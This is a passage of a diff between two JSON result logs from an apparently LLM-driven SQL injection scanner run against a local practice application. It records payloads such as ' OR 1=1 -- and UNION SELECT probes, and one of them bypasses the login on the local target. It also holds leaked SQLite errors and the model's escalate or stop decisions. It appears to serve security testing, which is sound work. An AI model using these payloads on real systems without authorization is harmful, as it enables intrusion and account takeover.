+                "elapsed_delta_ms": -36,
+                "sql_error": false,
+                "sql_error_excerpt": "",
+                "dbms_hint": "",
                 "auth_bypass_like": false
               },
               "llm_decision": {
                 "decision": "escalate",
-                "confidence": 0.9,
-                "reason": "Probe response exposed a SQL parser/database error.",
-                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
+                "confidence": 0.8,
+                "reason": "Endpoint is a search endpoint with query parameter and probe status is 200.",
+                "next_step": "Try another payload or gather more context."
               }
             }
           ],
           "final_decision": "escalate",
           "strongest_decision": "escalate",
-          "stop_reason": "Max attempts reached.",
+          "stop_reason": "LLM repeated an already attempted payload.",
           "confirmation_rejections": [
             {
-              "payload": "UNION SELECT NULL, NULL",
+              "payload": " OR 'a'='a",
               "response_signal": {
                 "available": false,
-                "reason": "Rejected before probe: String/search probe rejected because it lacks a string delimiter."
+                "reason": "Rejected before probe: Read confirmation rejected because it needs a constant-only UNION/read-channel payload."
               },
               "llm_decision": {
                 "decision": "stop",
                 "confidence": 1,
-                "reason": "String/search probe rejected because it lacks a string delimiter.",
-                "next_step": "Return only a parameter value that includes a quote or double-quote delimiter and a harmless boolean comparison."
+                "reason": "Read confirmation rejected because it needs a constant-only UNION/read-channel payload.",
+                "next_step": "Use a UNION SELECT or equivalent read-channel expression containing only harmless constants and the expected marker."
               }
             },
             {
-              "payload": "UNION SELECT NULL, 'marker'",
-              "response_signal": {
-                "available": true,
-                "baseline_status": 200,
-                "probe_status": 500,
-                "status_changed": true,
-                "content_type_changed": true,
-                "body_length_delta": 954,
-                "body_changed": true,
-                "elapsed_delta_ms": -10,
-                "sql_error": true,
-                "sql_error_excerpt": "wrapper\">\n      <h1>[REDACTED_SERVER_BANNER]</h1>\n      <h2><em>500</em> Error: SQLITE_ERROR: near &quot;marker&quot;: syntax error</h2>\n      <ul id=\"stacktrace\"></ul>\n    </div>\n  </body>\n</html>",
-                "dbms_hint": "sqlite",
-                "auth_bypass_like": false,
-                "read_marker": "marker",
-                "read_marker_reflected": false
-              },
-              "llm_decision": {
-                "decision": "escalate",
-                "confidence": 0.9,
-                "reason": "Probe response exposed a SQL parser/database error.",
-                "next_step": "Use one non-destructive confirmation if useful; otherwise report."
-              }
-            },
-            {
-              "payload": "UNION SELECT NULL, 'marker'",
+              "payload": "",
               "response_signal": {
                 "available": false,
-                "reason": "Rejected before probe: LLM repeated an already attempted payload."
+                "reason": "Read confirmation generation failed: LLM response did not contain a JSON object."
               },
               "llm_decision": {
-                "decision": "stop",
-                "confidence": 1,
-                "reason": "LLM repeated an already attempted payload.",
-                "next_step": "Choose a different endpoint-appropriate payload value."
-              }
-            },
-            {
-              "payload": "UNION SELECT NULL, 'marker'",
-              "response_signal": {
-                "available": false,
-                "reason": "Rejected before probe: LLM repeated an already attempted payload."
-              },
-              "llm_decision": {
-                "decision": "stop",
-                "confidence": 1,
-                "reason": "LLM repeated an already attempted payload.",
-                "next_step": "Choose a different endpoint-appropriate payload value."
-              }
-            },
-            {
-              "payload": "UNION SELECT NULL, 'marker'",
-              "response_signal": {
-                "available": false,
-                "reason": "Rejected before probe: LLM repeated an already attempted payload."
-              },
-              "llm_decision": {
-                "decision": "stop",
-                "confidence": 1,
-                "reason": "LLM repeated an already attempted payload.",
-                "next_step": "Choose a different endpoint-appropriate payload value."
-              }
-            },
-            {
-              "payload": "UNION SELECT NULL, 'marker'",
-              "response_signal": {
-                "available": false,
-                "reason": "Rejected before probe: LLM repeated an already attempted payload."
-              },
-              "llm_decision": {
-                "decision": "stop",
-                "confidence": 1,
-                "reason": "LLM repeated an already attempted payload.",
-                "next_step": "Choose a different endpoint-appropriate payload value."
-              }
-            },
-            {
-              "payload": "UNION SELECT NULL, 'marker'",
-              "response_signal": {
-                "available": false,
-                "reason": "Rejected before probe: LLM repeated an already attempted payload."
-              },
-              "llm_decision": {
-                "decision": "stop",
-                "confidence": 1,
-                "reason": "LLM repeated an already attempted payload.",
-                "next_step": "Choose a different endpoint-appropriate payload value."
-              }
-            },
-            {
-              "payload": "UNION SELECT NULL, 'marker'",
-              "response_signal": {
-                "available": false,
-                "reason": "Rejected before probe: LLM repeated an already attempted payload."
-              },
-              "llm_decision": {
-                "decision": "stop",
-                "confidence": 1,
-                "reason": "LLM repeated an already attempted payload.",
-                "next_step": "Choose a different endpoint-appropriate payload value."
-              }
-            },
-            {
-              "payload": "UNION SELECT NULL, 'marker'",
-              "response_signal": {
-                "available": false,
-                "reason": "Rejected before probe: LLM repeated an already attempted payload."
-              },
-              "llm_decision": {
-                "decision": "stop",
-                "confidence": 1,
-                "reason": "LLM repeated an already attempted payload.",
-                "next_step": "Choose a different endpoint-appropriate payload value."
-              }
-            },
-            {
-              "payload": "UNION SELECT NULL, 'marker'",
-              "response_signal": {
-                "available": false,
-                "reason": "Rejected before probe: LLM repeated an already attempted payload."
-              },
-              "llm_decision": {
-                "decision": "stop",
-                "confidence": 1,
-                "reason": "LLM repeated an already attempted payload.",
-                "next_step": "Choose a different endpoint-appropriate payload value."
-              }
-            },
-            {
-              "payload": "UNION SELECT NULL, 'marker'",
-              "response_signal": {
-                "available": false,
-                "reason": "Rejected before probe: LLM repeated an already attempted payload."
-              },
-              "llm_decision": {
-                "decision": "stop",
-                "confidence": 1,
-                "reason": "LLM repeated an already attempted payload.",
-                "next_step": "Choose a different endpoint-appropriate payload value."
+                "decision": "not_decidable",
+                "confidence": 0,
+                "reason": "LLM response did not contain a JSON object.",
+                "next_step": "Report confirmed error-based SQL injection."
               }
             }
           ]
@@ -653,7 +931,7 @@
       "url": "http://127.0.0.1:8080/rest/user/change-password",
       "endpoint_context": {
         "endpoint_type": "sensitive_write",
-        "resource": "User password change",
+        "resource": "User Password Change",
         "likely_sql_context": "write_operation",
         "recommended_attack_style": "skip_low_value",
         "avoid_payload_styles": [
@@ -661,7 +939,7 @@
         ],
         "probe_priority": "skip",
         "confidence": 0.8,
-        "reason": "Endpoint path and parameter names suggest a sensitive write operation."
+        "reason": "Endpoint path and parameter names suggest a sensitive write operation, and the presence of a 'current' query parameter may be used for boolean-based authentication bypass."
       },
       "params": [
         {
@@ -669,7 +947,7 @@
           "in": "query",
           "endpoint_context": {
             "endpoint_type": "sensitive_write",
-            "resource": "User password change",
+            "resource": "User Password Change",
             "likely_sql_context": "write_operation",
             "recommended_attack_style": "skip_low_value",
             "avoid_payload_styles": [
@@ -677,19 +955,19 @@
             ],
             "probe_priority": "skip",
             "confidence": 0.8,
-            "reason": "Endpoint path and parameter names suggest a sensitive write operation."
+            "reason": "Endpoint path and parameter names suggest a sensitive write operation, and the presence of a 'current' query parameter may be used for boolean-based authentication bypass."
           },
           "suitability": {
             "probe": false,
-            "confidence": 1,
-            "reason": "Endpoint is a sensitive write operation and recommends skipping low-value probes.",
+            "confidence": 0.8,
+            "reason": "Endpoint type is sensitive_write and recommended_attack_style is skip_low_value.",
             "starting_strategy": "skip"
           },
           "payload_count": 0,
           "attempts": [],
           "final_decision": "stop",
           "strongest_decision": "stop",
-          "stop_reason": "Skipped by suitability gate: Endpoint is a sensitive write operation and recommends skipping low-value probes."
+          "stop_reason": "Skipped by suitability gate: Endpoint type is sensitive_write and recommended_attack_style is skip_low_value."
         }
       ]
     },
@@ -709,7 +987,7 @@
         ],
         "probe_priority": "high",
         "confidence": 0.9,
-        "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup"
+        "reason": "Endpoint path and parameter names suggest authentication functionality."
       },
       "params": [
         {
@@ -727,25 +1005,25 @@
             ],
             "probe_priority": "high",
             "confidence": 0.9,
-            "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup"
+            "reason": "Endpoint path and parameter names suggest authentication functionality."
           },
           "suitability": {
             "probe": true,
             "confidence": 0.9,
-            "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup",
+            "reason": "Endpoint path and parameter names suggest authentication functionality.",
             "starting_strategy": "auth_boolean_bypass"
           },
           "payload_count": 1,
           "attempts": [
             {
               "payload_phase": "primary_probe",
-              "payload": "' OR '' = '' --",
-              "payload_rationale": "Repair the previous payload rejection by adding a single quote and a line comment marker.",
-              "expected_signal": "SQL parser error or auth probe success",
+              "payload": "' OR 1=1 --",
+              "payload_rationale": "Generated generic auth boolean-bypass probe for the identity field.",
+              "expected_signal": "authentication status changes from rejected to accepted",
               "expected_marker": "",
               "baseline": {
                 "status_code": 401,
-                "elapsed_ms": 2073,
+                "elapsed_ms": 2113,
                 "content_type": "text/html; charset=utf-8",
                 "location": "",
                 "body_length": 26,
@@ -753,7 +1031,7 @@
               },
               "probe": {
                 "status_code": 200,
-                "elapsed_ms": 2088,
+                "elapsed_ms": 2089,
                 "content_type": "application/json; charset=utf-8",
                 "location": "",
                 "body_length": 799,
@@ -767,7 +1045,7 @@
                 "content_type_changed": true,
                 "body_length_delta": 773,
                 "body_changed": true,
-                "elapsed_delta_ms": 15,
+                "elapsed_delta_ms": -24,
                 "sql_error": false,
                 "sql_error_excerpt": "",
                 "dbms_hint": "",
@@ -800,7 +1078,7 @@
             ],
             "probe_priority": "high",
             "confidence": 0.9,
-            "reason": "Endpoint is a login form with email and password fields, suggesting an authentication lookup"
+            "reason": "Endpoint path and parameter names suggest authentication functionality."
           },
           "suitability": {
             "probe": false,
@@ -822,16 +1100,17 @@
       "url": "http://127.0.0.1:8080/rest/user/security-question",
       "endpoint_context": {
         "endpoint_type": "other_data_endpoint",
-        "resource": "User Security Question",
+        "resource": "Security question",
         "likely_sql_context": "auth_lookup",
         "recommended_attack_style": "auth_boolean_bypass",
         "avoid_payload_styles": [
           "union_enum",
-          "auth_bypass"
+          "auth_bypass",
+          "numeric_probe"
         ],
         "probe_priority": "high",
         "confidence": 0.9,
-        "reason": "Endpoint is used to retrieve user security question, likely using email as a lookup parameter."
+        "reason": "Endpoint is used to retrieve security question and likely uses authentication lookup"
       },
       "params": [
         {
@@ -839,72 +1118,29 @@
           "in": "query",
           "endpoint_context": {
             "endpoint_type": "other_data_endpoint",
-            "resource": "User Security Question",
+            "resource": "Security question",
             "likely_sql_context": "auth_lookup",
             "recommended_attack_style": "auth_boolean_bypass",
             "avoid_payload_styles": [
               "union_enum",
-              "auth_bypass"
+              "auth_bypass",
+              "numeric_probe"
             ],
             "probe_priority": "high",
             "confidence": 0.9,
-            "reason": "Endpoint is used to retrieve user security question, likely using email as a lookup parameter."
+            "reason": "Endpoint is used to retrieve security question and likely uses authentication lookup"
           },
           "suitability": {
-            "probe": true,
+            "probe": false,
             "confidence": 0.9,
-            "reason": "Endpoint is used to retrieve user security question, likely using email as a lookup parameter.",
+            "reason": "Endpoint is used to retrieve security question and likely uses authentication lookup, but recommended_attack_style is auth_boolean_bypass which suggests probing is not recommended.",
             "starting_strategy": "auth_boolean_bypass"
           },
-          "payload_count": 1,
-          "attempts": [
-            {
-              "payload_phase": "primary_probe",
-              "payload": "' OR ' = '",
-              "payload_rationale": "Boolean bypass probe to test for SQLi vulnerability",
-              "expected_signal": "SQL parser error or unexpected response",
-              "expected_marker": "",
-              "baseline": {
-                "status_code": 200,
-                "elapsed_ms": 2099,
-                "content_type": "application/json; charset=utf-8",
-                "location": "",
-                "body_length": 2,
-                "body_sample": "{}"
-              },
-              "probe": {
-                "status_code": 200,
-                "elapsed_ms": 2085,
-                "content_type": "application/json; charset=utf-8",
-                "location": "",
-                "body_length": 2,
-                "body_sample": "{}"
-              },
-              "response_signal": {
-                "available": true,
-                "baseline_status": 200,
-                "probe_status": 200,
-                "status_changed": false,
-                "content_type_changed": false,
-                "body_length_delta": 0,
-                "body_changed": false,
-                "elapsed_delta_ms": -14,
-                "sql_error": false,
-                "sql_error_excerpt": "",
-                "dbms_hint": "",
-                "auth_bypass_like": false
-              },
-              "llm_decision": {
-                "decision": "stop",
-                "confidence": 0.0,
-                "reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change.",
-                "next_step": "Try another payload or gather more context."
-              }
-            }
-          ],
+          "payload_count": 0,
+          "attempts": [],
           "final_decision": "stop",
           "strongest_decision": "stop",
-          "stop_reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change."
+          "stop_reason": "Skipped by suitability gate: Endpoint is used to retrieve security question and likely uses authentication lookup, but recommended_attack_style is auth_boolean_bypass which suggests probing is not recommended."
         }
       ]
     },
@@ -913,52 +1149,52 @@
       "path": "/rest/user/whoami",
       "url": "http://127.0.0.1:8080/rest/user/whoami",
       "endpoint_context": {
-        "endpoint_type": "lookup_by_id",
-        "resource": "User information",
-        "likely_sql_context": "id_lookup",
-        "recommended_attack_style": "numeric_identifier_probe",
+        "endpoint_type": "profile_or_user",
+        "resource": "User Profile Information",
+        "likely_sql_context": "auth_lookup",
+        "recommended_attack_style": "auth_boolean_bypass",
         "avoid_payload_styles": [
           "union_enum",
           "auth_bypass"
         ],
         "probe_priority": "high",
         "confidence": 0.8,
-        "reason": "The endpoint is a GET request to retrieve user information by ID, suggesting a numeric identifier probe is the most suitable attack style."
+        "reason": "Endpoint is likely used for authentication and returns user profile information."
       },
       "params": [
         {
           "name": "fields",
           "in": "query",
           "endpoint_context": {
-            "endpoint_type": "lookup_by_id",
-            "resource": "User information",
-            "likely_sql_context": "id_lookup",
-            "recommended_attack_style": "numeric_identifier_probe",
+            "endpoint_type": "profile_or_user",
+            "resource": "User Profile Information",
+            "likely_sql_context": "auth_lookup",
+            "recommended_attack_style": "auth_boolean_bypass",
             "avoid_payload_styles": [
               "union_enum",
               "auth_bypass"
             ],
             "probe_priority": "high",
             "confidence": 0.8,
-            "reason": "The endpoint is a GET request to retrieve user information by ID, suggesting a numeric identifier probe is the most suitable attack style."
+            "reason": "Endpoint is likely used for authentication and returns user profile information."
           },
           "suitability": {
             "probe": true,
             "confidence": 0.8,
-            "reason": "The endpoint is a GET request to retrieve user information by ID, suggesting a numeric identifier probe is the most suitable attack style.",
-            "starting_strategy": "numeric_identifier_probe"
+            "reason": "Endpoint is likely used for authentication and returns user profile information.",
+            "starting_strategy": "auth_boolean_bypass"
           },
           "payload_count": 2,
           "attempts": [
             {
               "payload_phase": "primary_probe",
-              "payload": "1' OR 1=1 --",
-              "payload_rationale": "numeric identifier probe with boolean confirmation",
-              "expected_signal": "SQL parser error or unexpected response",
+              "payload": "'1'='1' /*",
+              "payload_rationale": "auth_boolean_bypass",
+              "expected_signal": "SQL parser error",
               "expected_marker": "",
               "baseline": {
                 "status_code": 200,
-                "elapsed_ms": 2082,
+                "elapsed_ms": 2087,
                 "content_type": "application/json; charset=utf-8",
                 "location": "",
                 "body_length": 11,
@@ -966,7 +1202,7 @@
               },
               "probe": {
                 "status_code": 200,
-                "elapsed_ms": 2082,
+                "elapsed_ms": 2086,
                 "content_type": "application/json; charset=utf-8",
                 "location": "",
                 "body_length": 11,
@@ -980,28 +1216,28 @@
                 "content_type_changed": false,
                 "body_length_delta": 0,
                 "body_changed": false,
-                "elapsed_delta_ms": 0,
+                "elapsed_delta_ms": -1,
                 "sql_error": false,
                 "sql_error_excerpt": "",
                 "dbms_hint": "",
                 "auth_bypass_like": false
               },
               "llm_decision": {
-                "decision": "not_decidable",
-                "confidence": 0.5,
-                "reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change.",
-                "next_step": "Try another payload or gather more context."
+                "decision": "stop",
+                "confidence": 0.8,
+                "reason": "Enough evidence was gathered, no useful signal remains, or endpoint is not suitable.",
+                "next_step": "No further action is required for this endpoint."
               }
             },
             {
               "payload_phase": "primary_probe",
-              "payload": "1 OR 1=1",
-              "payload_rationale": "Deliberately mismatched parentheses to force a SQL parser error.",
-              "expected_signal": "SQL parser error with mismatched parentheses",
+              "payload": "1=1",
+              "payload_rationale": "Compact single-quote-delimited boolean probe to account for trailing password predicates.",
+              "expected_signal": "SQL parser error or a useful SQLi signal",
               "expected_marker": "",
               "baseline": {
                 "status_code": 200,
-                "elapsed_ms": 2071,
+                "elapsed_ms": 2068,
                 "content_type": "application/json; charset=utf-8",
                 "location": "",
                 "body_length": 11,
@@ -1009,7 +1245,7 @@
               },
               "probe": {
                 "status_code": 200,
-                "elapsed_ms": 2069,
+                "elapsed_ms": 2087,
                 "content_type": "application/json; charset=utf-8",
                 "location": "",
                 "body_length": 11,
@@ -1023,26 +1259,26 @@
                 "content_type_changed": false,
                 "body_length_delta": 0,
                 "body_changed": false,
-                "elapsed_delta_ms": -2,
+                "elapsed_delta_ms": 19,
                 "sql_error": false,
                 "sql_error_excerpt": "",
                 "dbms_hint": "",
                 "auth_bypass_like": false
               },
               "llm_decision": {
-                "decision": "not_decidable",
-                "confidence": 0.5,
-                "reason": "Baseline and probe are effectively identical and there is no SQL error, auth bypass, timing, content-type, or meaningful body change.",
-                "next_step": "Try another payload or gather more context."
+                "decision": "stop",
+                "confidence": 0.8,
+                "reason": "Enough evidence was gathered, no useful signal remains, or endpoint is not suitable.",
+                "next_step": "Move on to the next target"
               }
             }
           ],
-          "final_decision": "not_decidable",
-          "strongest_decision": "not_decidable",
+          "final_decision": "stop",
+          "strongest_decision": "stop",
           "stop_reason": "Stopped because the response matched baseline closely; there was no useful error or behavior signal to adapt from."
         }
       ]
     }
   ],
-  "finished_at": "2026-06-25T17:38:28.861298+00:00"
+  "finished_at": "2026-06-26T06:11:53.301692+00:00"
 }
